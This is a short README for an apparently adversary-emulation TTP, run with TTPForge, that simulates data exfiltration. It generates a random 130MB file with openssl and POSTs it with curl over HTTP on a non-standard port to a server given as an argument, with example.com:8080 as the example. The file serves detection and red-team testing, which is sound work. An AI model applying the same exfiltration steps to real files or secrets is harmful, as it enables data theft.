# HTTP Non-Standard Port Exfiltration

## Description
This TTP uses curl to send data out over HTTP using non-standard ports. It generates a random 130MB file for exfiltration and sends it to a specified web server using an HTTP POST request.

## Arguments
- **web_server**: The URL to exfiltrate the 130MB test file to. (Required, no default)

## Requirements
- Linux operating system

## Example(s)
You can run this TTP with the following command:
```bash
ttpforge run forgearmory//exfiltration/http-non-std-port-exfil/ttp.yaml --arg web_server=http://example.com:8080
```

## Steps
1. **generate_random_file**: Generate a random 130MB file using openssl for use as the exfiltration payload.
2. **exfil_over_curl**: Use curl to POST the generated file to the specified web server. On cleanup, the generated testfile.txt is removed.
